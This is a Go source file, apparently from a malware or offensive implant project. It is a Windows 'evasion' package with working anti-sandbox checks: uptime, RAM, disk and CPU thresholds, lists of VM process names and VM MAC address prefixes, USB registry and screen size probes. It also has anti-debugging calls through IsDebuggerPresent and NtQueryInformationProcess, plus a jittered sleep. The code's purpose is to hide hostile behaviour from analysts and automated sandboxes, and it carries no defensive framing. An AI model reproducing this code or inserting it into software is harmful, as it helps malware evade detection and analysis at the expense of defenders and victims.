//go:build windows

package evasion

import (
	"crypto/rand"
	"math/big"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

// AntiSandbox performs multiple checks to detect if running in a sandbox/VM.
// Returns true if the environment appears to be a real machine.
func AntiSandbox() bool {
	checks := []func() bool{
		checkUptime,
		checkRAM,
		checkDiskSize,
		checkCPUCores,
		checkVMProcesses,
		checkMACAddress,
		checkUSBDevices,
		checkScreenResolution,
	}

	// Require at least 5 out of 8 checks to pass
	passed := 0
	for _, check := range checks {
		if check() {
			passed++
		}
	}

	return passed >= 5
}

// checkUptime verifies the system has been running for a reasonable time.
// Sandboxes typically have very short uptime.
func checkUptime() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getTickCount := kernel32.NewProc("GetTickCount")

	ret, _, _ := getTickCount.Call()
	uptime := time.Duration(uint32(ret)) * time.Millisecond

	// Require at least 10 minutes uptime
	return uptime > 10*time.Minute
}

// checkRAM verifies sufficient RAM is available.
// Sandboxes often have limited memory.
func checkRAM() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")

	type MemoryStatusEx struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}

	ms := MemoryStatusEx{Length: 64}
	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&ms)))
	if ret == 0 {
		return true // Assume OK if check fails
	}

	// Require at least 2GB RAM
	return ms.TotalPhys > 2*1024*1024*1024
}

// checkDiskSize verifies sufficient disk space.
func checkDiskSize() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getDiskFreeSpaceEx := kernel32.NewProc("GetDiskFreeSpaceExW")

	var freeBytes, totalBytes, totalFree uint64
	dir, _ := syscall.UTF16PtrFromString("C:\\")
	ret, _, _ := getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(dir)),
		uintptr(unsafe.Pointer(&freeBytes)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFree)),
	)

	if ret == 0 {
		return true
	}

	// Require at least 10GB free
	return freeBytes > 10*1024*1024*1024
}

// checkCPUCores verifies sufficient CPU cores.
func checkCPUCores() bool {
	return runtime.NumCPU() >= 2
}

// checkVMProcesses looks for known VM/sandbox processes.
func checkVMProcesses() bool {
	vmProcesses := []string{
		"vboxservice.exe",
		"vboxtray.exe",
		"vmtoolsd.exe",
		"vmwaretray.exe",
		"vmwareuser.exe",
		"vmacthlp.exe",
		"xenservice.exe",
		"sandboxiedcomserver.exe",
		"sniffer.exe",
		"vmsrvc.exe",
	}

	// Use tasklist to check running processes
	cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
	out, err := cmd.Output()
	if err != nil {
		return true // Assume OK if check fails
	}

	output := strings.ToLower(string(out))
	for _, proc := range vmProcesses {
		if strings.Contains(output, proc) {
			return false
		}
	}

	return true
}

// checkMACAddress checks for known VM MAC address prefixes.
func checkMACAddress() bool {
	vmPrefixes := []string{
		"00:05:69", // VMware
		"00:0C:29", // VMware
		"00:1C:14", // VMware
		"00:50:56", // VMware
		"08:00:27", // VirtualBox
		"00:16:E3", // Xen
		"00:1D:D8", // Xen
	}

	// Get MAC addresses via ipconfig
	cmd := exec.Command("ipconfig", "/all")
	out, err := cmd.Output()
	if err != nil {
		return true
	}

	output := strings.ToUpper(string(out))
	for _, prefix := range vmPrefixes {
		if strings.Contains(output, strings.ToUpper(prefix)) {
			return false
		}
	}

	return true
}

// checkUSBDevices checks for connected USB devices.
// Sandboxes rarely have USB devices.
func checkUSBDevices() bool {
	// Check for USB devices in registry
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Enum\USB`, registry.READ)
	if err != nil {
		return false // No USB devices found
	}
	defer key.Close()

	names, err := key.ReadSubKeyNames(0)
	if err != nil {
		return false
	}

	return len(names) > 0
}

// checkScreenResolution verifies a reasonable screen resolution.
// Sandboxes often have very small or no displays.
func checkScreenResolution() bool {
	user32 := syscall.NewLazyDLL("user32.dll")
	getSystemMetrics := user32.NewProc("GetSystemMetrics")

	width, _, _ := getSystemMetrics.Call(0) // SM_CXSCREEN
	height, _, _ := getSystemMetrics.Call(1) // SM_CYSCREEN

	// Require at least 800x600
	return width >= 800 && height >= 600
}

// AntiDebug performs multiple anti-debugging checks.
func AntiDebug() bool {
	if isDebuggerPresent() {
		return false
	}
	if isRemoteDebuggerPresent() {
		return false
	}
	return true
}

func isDebuggerPresent() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")

	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func isRemoteDebuggerPresent() bool {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	var debugPort uint32
	status, _, _ := ntQueryInformationProcess.Call(
		uintptr(0xFFFFFFFF), // NtCurrentProcess
		7,                   // ProcessDebugPort
		uintptr(unsafe.Pointer(&debugPort)),
		unsafe.Sizeof(debugPort),
		0,
	)

	return status == 0 && debugPort != 0
}

// SleepWithJitter sleeps for a random duration between min and max.
func SleepWithJitter(min, max time.Duration) {
	delta := max - min
	if delta <= 0 {
		time.Sleep(min)
		return
	}

	randVal, _ := rand.Int(rand.Reader, big.NewInt(delta.Nanoseconds()))
	sleepTime := min + time.Duration(randVal.Int64())
	time.Sleep(sleepTime)
}

// Ensure imports are used
var _ = exec.Command
